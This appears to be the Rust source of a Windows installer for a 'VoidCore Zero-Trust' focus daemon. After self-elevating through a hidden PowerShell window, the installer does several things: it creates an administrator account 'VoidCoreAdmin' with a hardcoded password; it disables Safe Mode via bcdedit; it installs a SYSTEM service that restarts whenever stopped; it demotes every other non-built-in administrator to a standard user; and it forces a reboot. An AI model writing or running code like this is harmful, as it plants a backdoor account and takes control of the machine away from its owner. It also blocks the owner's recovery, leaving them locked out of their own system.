use std::env;
use std::fs;
use std::path::Path;
use std::process::Command;
use rand::RngCore;

// These macros bake the compiled binaries directly into the installer EXE.
// They are only triggered in CI when the `bundled` feature is passed.
#[cfg(feature = "bundled")]
const SERVICE_EXE: &[u8] = include_bytes!("../payloads/voidcore-service.exe");

#[cfg(feature = "bundled")]
const GUI_EXE: &[u8] = include_bytes!("../payloads/voidcore-gui.exe");

fn run_cmd(cmd: &mut Command) -> anyhow::Result<()> {
    let output = cmd.output()?;
    if !output.status.success() {
        eprintln!("Command failed: {:?}\nstderr:{}", cmd, String::from_utf8_lossy(&output.stderr));
    }
    Ok(())
}

fn run_cmd_silent(cmd: &mut Command) {
    let _ = cmd.output();
}

fn check_elevation() -> bool {
    Command::new("net").args(["session"]).output().map(|o| o.status.success()).unwrap_or(false)
}

fn elevate_self() -> anyhow::Result<()> {
    let exe = env::current_exe()?;
    let ps_cmd = format!("Start-Process -FilePath '{}' -Verb RunAs", exe.display());
    Command::new("powershell")
        .args(["-NoProfile", "-WindowStyle", "Hidden", "-Command", &ps_cmd])
        .spawn()?;
    Ok(())
}

fn main() -> anyhow::Result<()> {
    // 1. Self-Elevation
    if !check_elevation() {
        println!("Requesting Administrative privileges...");
        elevate_self()?;
        return Ok(());
    }

    // 2. Guard against non-CI builds running
    #[cfg(not(feature = "bundled"))]
    {
        println!("Error: Installer compiled without bundled payloads. Use the GitHub Actions CI pipeline.");
        std::process::exit(1);
    }

    // 3. Run installation
    #[cfg(feature = "bundled")]
    install_bundled()?;

    Ok(())
}

#[cfg(feature = "bundled")]
fn install_bundled() -> anyhow::Result<()> {
    println!("===================================================");
    println!("        VoidCore Zero-Trust Setup Wizard           ");
    println!("===================================================");
    println!("[*] Extracting embedded payloads...");

    let target_dir = Path::new(r"C:\ProgramData\VoidCore");
    if !target_dir.exists() { fs::create_dir_all(target_dir)?; }

    // Drop EXEs
    fs::write(target_dir.join("voidcore-service.exe"), SERVICE_EXE)?;
    fs::write(target_dir.join("voidcore-gui.exe"), GUI_EXE)?;

    // Drop Config with compile-time injected public key from CI env vars
    let mut cfg = voidcore_shared::RuntimeConfig::default();
    let injected_pubkey = option_env!("VOIDCORE_PUBKEY").unwrap_or("");
    if !injected_pubkey.is_empty() {
        cfg.pubkey_hex = injected_pubkey.to_string();
    }
    fs::write(target_dir.join("config.json"), serde_json::to_string_pretty(&cfg)?)?;

    // Drop secure GUI Auth Token
    let mut rng = rand::thread_rng();
    let mut buf = [0u8; 32];
    rng.fill_bytes(&mut buf);
    let token = hex::encode(buf);
    let gui_token_path = target_dir.join("gui.token");
    fs::write(&gui_token_path, token)?;

    println!("[*] Configuring Environment Variables...");
    let ps_path = r#"
        $cur = [Environment]::GetEnvironmentVariable('Path','Machine')
        if (-not ($cur -like '*C:\ProgramData\VoidCore*')) {
            [Environment]::SetEnvironmentVariable('Path', $cur + ';C:\ProgramData\VoidCore', 'Machine')
        }
    "#;
    run_cmd(Command::new("powershell").args(["-NoProfile","-NonInteractive","-WindowStyle","Hidden","-Command", ps_path]))?;

    // Record Installer SID for IPC ACLs
    let whoami_out = Command::new("whoami").output()?;
    let installer = String::from_utf8_lossy(&whoami_out.stdout).trim().to_string();
    let sid_ps = format!(r#"(New-Object System.Security.Principal.NTAccount('{inst}')).Translate([System.Security.Principal.SecurityIdentifier]).Value"#, inst=installer);
    let sid_out = Command::new("powershell").args(["-NoProfile","-NonInteractive","-Command", &sid_ps]).output()?;
    let sid = String::from_utf8_lossy(&sid_out.stdout).trim().to_string();
    if !sid.is_empty() {
        fs::write(target_dir.join("installer.sid"), sid)?;
    }

    println!("[*] Securing File Access Control Lists (ACLs)...");
    let cfg_path = r"C:\ProgramData\VoidCore\config.json";
    run_cmd(Command::new("icacls").args([gui_token_path.to_str().unwrap(), "/inheritance:r"]))?;
    run_cmd(Command::new("icacls").args([gui_token_path.to_str().unwrap(), "/grant", "SYSTEM:F"]))?;
    run_cmd(Command::new("icacls").args([gui_token_path.to_str().unwrap(), "/grant", "Administrators:F"]))?;
    run_cmd(Command::new("icacls").args([gui_token_path.to_str().unwrap(), "/grant", &format!("{}:R", installer)]))?;

    run_cmd(Command::new("icacls").args([cfg_path, "/inheritance:r"]))?;
    run_cmd(Command::new("icacls").args([cfg_path, "/grant", "SYSTEM:F"]))?;
    run_cmd(Command::new("icacls").args([cfg_path, "/grant", "Administrators:F"]))?;
    run_cmd(Command::new("icacls").args([cfg_path, "/grant", &format!("{}:R", installer)]))?;

    println!("[*] Creating VoidCore Admin Account...");
    run_cmd_silent(Command::new("net").args(["user", "VoidCoreAdmin", "V0idC0reTempP@ss!", "/add"]));
    run_cmd_silent(Command::new("net").args(["localgroup", "Administrators", "VoidCoreAdmin", "/add"]));

    println!("[*] Destroying Safe Mode...");
    run_cmd_silent(Command::new("bcdedit").args(["/set", "{default}", "bootmenupolicy", "standard"]));
    run_cmd_silent(Command::new("bcdedit").args(["/deletevalue", "{default}", "safeboot"]));

    println!("[*] Registering NT AUTHORITY\\SYSTEM Daemon...");
    run_cmd_silent(Command::new("sc").args(["stop", "VoidCoreDaemon"]));
    std::thread::sleep(std::time::Duration::from_secs(2));
    run_cmd_silent(Command::new("sc").args(["delete", "VoidCoreDaemon"]));
    
    run_cmd(Command::new("sc").args([
        "create", "VoidCoreDaemon", "binPath=", "C:\\ProgramData\\VoidCore\\voidcore-service.exe",
        "start=", "auto", "obj=", "LocalSystem", "DisplayName=", "VoidCore Zero-Trust Daemon",
    ]))?;

    run_cmd(Command::new("sc").args(["description", "VoidCoreDaemon", "VoidCore Zero-Trust focus daemon — DO NOT STOP"]))?;
    run_cmd(Command::new("sc").args(["failure", "VoidCoreDaemon", "reset=", "0", "actions=", "restart/2000/restart/5000/restart/10000"]))?;
    run_cmd(Command::new("sc").args(["start", "VoidCoreDaemon"]))?;

    println!("[*] Creating Start Menu Shortcut...");
    let start_ps = r#"
        $programs = "$env:ProgramData\Microsoft\Windows\Start Menu\Programs"
        $dir = Join-Path $programs 'VoidCore'
        if (!(Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
        $ws = New-Object -ComObject WScript.Shell
        $lnk = $ws.CreateShortcut((Join-Path $dir 'VoidCore.lnk'))
        $lnk.TargetPath = 'C:\ProgramData\VoidCore\voidcore-gui.exe'
        $lnk.WorkingDirectory = 'C:\ProgramData\VoidCore'
        $lnk.IconLocation = 'C:\ProgramData\VoidCore\voidcore-gui.exe,0'
        $lnk.Save()
    "#;
    run_cmd(Command::new("powershell").args(["-NoProfile","-NonInteractive","-WindowStyle","Hidden","-Command", start_ps]))?;

    println!("[*] Demoting current user to Standard User...");
    let demote_ps = r#"
        $admins = Get-LocalGroupMember -Group 'Administrators' | Where-Object { $_.ObjectClass -eq 'User' }
        foreach ($a in $admins) {
            $name = $a.Name -replace '.*\\','' 
            if ($name -ne 'VoidCoreAdmin' -and $name -ne 'Administrator') {
                Add-LocalGroupMember -Group 'Users' -Member $a.Name -ErrorAction SilentlyContinue
                Remove-LocalGroupMember -Group 'Administrators' -Member $a.Name -ErrorAction SilentlyContinue
            }
        }
    "#;
    run_cmd(Command::new("powershell").args(["-NoProfile","-NonInteractive","-WindowStyle","Hidden","-Command", demote_ps]))?;

    println!("===================================================");
    println!("SUCCESS! VoidCore Zero-Trust Environment Activated.");
    println!("===================================================");
    println!("The system will lock and reboot in 15 seconds.");
    
    run_cmd(Command::new("shutdown").args(["/r","/t","15","/c","VoidCore Setup Complete. Locking system and rebooting."]))?;
    std::thread::sleep(std::time::Duration::from_secs(15));
    Ok(())
}